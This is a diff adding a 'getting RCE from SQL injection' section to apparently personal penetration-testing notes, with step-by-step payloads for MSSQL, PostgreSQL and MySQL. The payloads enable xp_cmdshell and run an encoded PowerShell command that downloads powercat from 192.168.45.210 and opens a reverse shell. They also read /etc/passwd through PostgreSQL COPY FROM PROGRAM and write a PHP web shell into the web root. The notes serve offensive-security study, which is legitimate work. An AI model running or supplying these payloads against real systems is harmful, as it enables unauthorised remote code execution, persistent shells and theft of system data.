@@ -103,3 +103,107 @@ equivalent to `SHOW DATABASES`:
 SELECT schema_name 
 FROM information_schema.schemata;
 ```
+
+
+
+## In Practice: Getting RCE from SQLi
+
+### MSSQL (Error Based)
+
+Assume we find an input field on a website vulnerable to SQLi in MSSQL, the process goes like this:
+
+in burp, assume we can set the Username like this:
+
+```
+Username=admin'+UNION+SELECT+1,2--//
+```
+
+And execute SQL.
+
+Start by using this statement to figure out how many columns are in the table we are querying:
+
+Starting out `UNION SELECT 1 --//`
+and add `,2,3,4,5...` one at a time until you don't get an error
+Now, you know how many colums are in the table you are querying.
+
+
+
+Now, let's see if we can get a shell.
+Looks like we can execute arbitrary SQL on the machine by terminating the statement with ; and running:
+
+```
+EXEC sp_configure 'show advanced options',1;
+RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell',1;
+RECONFIGURE;
+EXEC master.dbo.xp_cmdshell 'powershell -enc $ENCODED_REV_SHELL';
+```
+
+This could for instance look like this for the final statement:
+
+```
+Username=admin';EXEC master.dbo.xp_cmdshell 'powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADIAMQAwADoAOAAwAC8AcABvAHcAZQByAGMAYQB0AC4AcABzADEAJwApADsAcABvAHcAZQByAGMAYQB0ACAALQBjACAAMQA5ADIALgAxADYAOAAuADQANQAuADIAMQAwACAALQBwACAANAA0ADMAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsAA==';--//
+```
+
+
+### PostgreSQL (Error Based)
+
+
+Assume we have a parameter on a site that is vulnerable, and we figure out the db is postgresql on a linux machine:
+
+Now, we can do stuff like:
+
+
+```
+'; SELECT 1=cast((SELECT current_user) as int) --
+```
+
+This will attempt to cast the username as an int, throwing an exception.
+Assume the result is  `joe`.
+We can check if `joe` is a superuser with:
+
+
+```
+'; SELECT usesuper, CASE WHEN (usesuper = true) THEN 1/(SELECT 0) ELSE (SELECT 0) END from pg_user where usename = 'joe' --
+```
+
+This will give a divison by zero error if `joe` is a superuser.
+If he is, and the postgresql server is in certain versions, we can now get RCE with:
+
+```
+DROP TABLE IF EXISTS cmd_exec;
+CREATE TABLE cmd_exec(cmd_output text);
+COPY cmd_exec FROM PROGRAM 'cat /etc/passwd';
+SELECT * FROM cmd_exec;
+DROP TABLE IF EXISTS cmd_exec;
+```
+
+This could be done by downloading and running a `shell.sh`.
+
+
+### MySQL (Error Based)
+
+Assuming we have some field that's vulnerable, and the web server is a php server with a MySQL backend.
+Note that this example stops the query with `#` as MySQL uses that as a comment character.
+If the param is `email=`, let's start by figuring out the number of colums in the table being queried:
+
+ ```
+email=hacks%40hacks.com' ORDER BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36 #
+```
+Assume we can see it complains about column 5. So the query being made is made to a table with 4 columns. 
+
+Then, we can write a shell we can exploit:
+
+```
+email=hacks%40hacks.com' UNION SELECT null, "<?php echo shell_exec($_GET['cmd']);?>", null, null into OUTFILE '/var/www/html/shell.php' #
+```
+
+Now, we can access `shell.php` in `/shell.php`.
+
+
+(note, for windows, we can put it in `C:/inetpub/wwwroot/shell.php`)
+
+
+
+
+
